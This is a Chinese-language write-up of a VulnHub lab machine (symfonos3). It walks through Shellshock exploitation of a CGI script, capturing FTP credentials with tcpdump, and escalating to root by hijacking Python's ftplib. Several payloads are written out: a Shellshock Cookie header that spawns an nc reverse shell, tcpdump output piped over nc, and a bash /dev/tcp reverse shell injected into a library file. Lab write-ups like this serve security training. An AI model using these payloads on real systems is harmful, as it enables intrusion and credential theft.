+++
date = '2026-10-22T18:29:45+08:00'
draft = false
title = '[VulnHub靶机]symfonos3渗透记录'
tags = ['渗透','Vulnhub','Shellshock','流量分析']
+++

## 信息收集

攻击机IP: 192.168.200.146  
使用arp-scan找到靶机IP(192.168.200.162)

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       (Unknown)
192.168.200.2   00:50:56:fc:41:2a       (Unknown)
192.168.200.162 00:0c:29:27:97:03       (Unknown)
192.168.200.254 00:50:56:ec:d0:be       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.916 seconds (133.61 hosts/sec). 4 responded
```

### 端口扫描

全端口扫描

```shell
┌──(root㉿kali)-[/home/kali/symfonos3]
└─# nmap --min-rate 10000 -p- 192.168.200.162             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-22 18:37 +0800
Nmap scan report for 192.168.200.162
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:27:97:03 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
```

对开放的端口进行详细扫描

```shell
┌──(root㉿kali)-[/home/kali/symfonos3]
└─# nmap -sT -sV -sC -p21,22,80 192.168.200.162                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-22 18:39 +0800
Nmap scan report for 192.168.200.162
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:27:97:03 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

漏洞扫描, 没有收获

```shell
┌──(root㉿kali)-[/home/kali/symfonos3]
└─# nmap --script=vuln -p21,22,80 192.168.200.162                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-22 18:40 +0800
Nmap scan report for 192.168.200.162
Host is up (0.00040s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
MAC Address: 00:0C:29:27:97:03 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.48 seconds
```

### Web路径爆破

浏览器访问Web服务, 只有一张图片, 注意到注释"Can you bust the underworld?"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E8%AE%BF%E9%97%AEWeb%E9%A1%B5%E9%9D%A2.avif)

用/usr/share/dirb/wordlists/common.txt字典爆破, 发现gate目录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E5%8F%91%E7%8E%B0gate%E7%9B%AE%E5%BD%95.avif)

访问发现仍是一张图片, 且没有任何提示

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E8%AE%BF%E9%97%AEgate.avif)

在gate目录下爆破没有结果, 在已有的目录拼接underworld也都是404, 使用dirsearch扫到了一些403目录, 我们尝试在这些目录后拼接underworld

```shell
[19:13:35] 403 -  280B  - /cgi-bin/
[19:13:46] 403 -  280B  - /server-status
[19:13:46] 403 -  280B  - /server-status/
```

```shell
┌──(kali㉿kali)-[~]
└─$ for p in /cgi-bin/ /server-status /server-status/; do curl http://192.168.200.162/"$p"/underworld -w "%{http_code}" -o /dev/null -s; echo " $p "; done
200 /cgi-bin/ 
403 /server-status 
403 /server-status/
```

/cgi-bin/underworld 返回200, 请求发现返回uptime的字符串

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.200.162/cgi-bin/underworld
 06:40:45 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
```

使用nikto对http://192.168.200.162/cgi-bin/underworld进行扫描, 发现存在shellshock漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E5%8F%91%E7%8E%B0shellshock%E6%BC%8F%E6%B4%9E.avif)

## 漏洞利用

> 漏洞原理:  
>
> - bash在处理环境变量时, 若变量值以`() { `开头(包含空格), 则会将其视为函数定义, 但解析函数体后, 未严格校验边界, 直接执行了后面的尾随命令, 攻击者可据此进行命令注入攻击
> - CGI会将访问者以下的HTTP请求头存入环境变量:
>
> | HTTP头 | 对应的环境变量 |
> | ------ | ------------- |
> | User-Agent | HTTP_USER_AGENT |
> | Referer | HTTP_REFERER |
> | Cookie | HTTP_COOKIE |
>
> 那么攻击者只需对这些头传入恶意值, 即可RCE

攻击机使用rlwrap nc -lvvp 4444监听, 构建Payload发送给靶机, 成功反弹shell

```shell
┌──(kali㉿kali)-[~]
└─$ curl -H "Cookie: () { :;}; /bin/bash -c 'nc 192.168.200.146 4444 -e /bin/sh'" http://192.168.200.162/cgi-bin/underworld

┌──(root㉿kali)-[~kali/symfonos3]
└─# nc -lvvp 4444
listening on [any] 4444 ...
192.168.200.162: inverse host lookup failed: Unknown host
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.162] 35980
```

## 权限提升

终端升级

```shell
python -c "import pty;pty.spawn('/bin/bash')"
cerberus@symfonos3:/usr/lib/cgi-bin$
```

### 枚举

手动枚举没有发现, 使用[pspy](https://github.com/DominicBreuker/pspy), 该工具可以查看其他用户或系统（如 root）执行的命令和定时任务

```shell
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

运行pspy64, 等待一会, 能够发现每过一段时间就会运行ftpclient.py, 紧接着就是proftp的连接成功信息, 推测该脚本登录了靶机的FTP服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E5%8F%91%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5FTP.avif)

尝试查看脚本, 发现无权限

```shell
cerberus@symfonos3:/opt$ ls -lh
ls -lh
total 4.0K
drwxr-x--- 2 root hades 4.0K Apr  6  2020 ftpclient
cerberus@symfonos3:/opt$ ls -ldh ./ftpclient/ftpclient.py
ls -ldh ./ftpclient/ftpclient.py
ls: cannot access './ftpclient/ftpclient.py': Permission denied
cerberus@symfonos3:/opt$ cat ./ftpclient/ftpclient.py
cat ./ftpclient/ftpclient.py
cat: ./ftpclient/ftpclient.py: Permission denied
```

查看当前用户所在组, 发现在pcap组中, 那么意味着我们拥有抓包的权限, 且靶机中存在tcpdump, 我们可以尝试抓取FTP登录时的数据包, 从中提取密码(FTP登录时的密码是明文传输的)

```shell
cerberus@symfonos3:/opt$ id
id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
cerberus@symfonos3:/opt$ which tcpdump
which tcpdump
/usr/local/bin/tcpdump
```

### 抓包并提取FTP密码

攻击机用nc开启监听, 用tee分流输出

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 5555 | tee data.pcap
listening on [any] 5555 ...
```

靶机使用tcpdump在21端口抓包并将输出转发到攻击机

```shell
cerberus@symfonos3:/opt$ tcpdump -i any -nn port 21 -w - | nc 192.168.200.146 5555
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E6%94%B6%E5%88%B0%E6%8A%93%E5%8C%85%E6%95%B0%E6%8D%AE.avif)

抓包到的二进制数据中存在PASS字符串, 后面的估计就是密码了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E6%94%B6%E5%88%B0%E6%8A%93%E5%8C%85%E6%95%B0%E6%8D%AE.avif)

使用Wireshark打开数据包, 使用追踪流功能查看通讯过程, 发现密码果然是PTpZTfU4vxgzvRBE, 用户名是hades

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/Wireshark%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81.avif)

使用提取的密码登录FTP服务器, 但输入ls没有返回任何结果

```shell
┌──(kali㉿kali)-[~/symfonos3]
└─$ ftp 192.168.200.162
Connected to 192.168.200.162.
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.200.162]
Name (192.168.200.162:kali): hades                                   
331 Password required for hades
Password:                         
230 User hades logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10315|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
```

尝试登录ssh, 成功

```shell
ssh hades@192.168.200.162
hades@symfonos3:~$
```

查看之前不能看的ftpclient.py

```shell
hades@symfonos3:/opt/ftpclient$ ls -l
total 8
-rw-r--r-- 1 root hades 262 Apr  6  2020 ftpclient.py
-rw-r--r-- 1 root hades 251 Oct 22 10:31 statuscheck.txt
```

```python
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```

无法直接修改ftpclient.py, 但它引用了ftplib库, 那么我们可以修改ftplib库的代码, 从而反弹shell  
查找ftplib位置
```shell
hades@symfonos3:/opt/ftpclient$ python -c "import ftplib;print(ftplib.__file__)"
/usr/lib/python2.7/ftplib.pyc
hades@symfonos3:/opt/ftpclient$ cd /usr/lib/python2.7/
hades@symfonos3:/usr/lib/python2.7$ ls -ld ftp*
-rwxrw-r-- 1 root gods 37755 Sep 26  2018 ftplib.py
-rwxrw-r-- 1 root gods 34438 Jul 19  2019 ftplib.pyc
```

注意到gods组用户对ftplib.py有写权限, 而我们现在登录的hades账户正好在这个组中

```shell
hades@symfonos3:/usr/lib/python2.7$ id
uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)
```

攻击机使用nc监听5555端口, 在ftplib.py开头插入以下代码

```python
import os
os.system("bash -c 'bash -i >&/dev/tcp/192.168.200.146/5555 0>&1'")
```

等待一段时间, 即可拿到shell, 读取flag

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/symfonos3/%E8%8E%B7%E5%BE%97flag.avif)
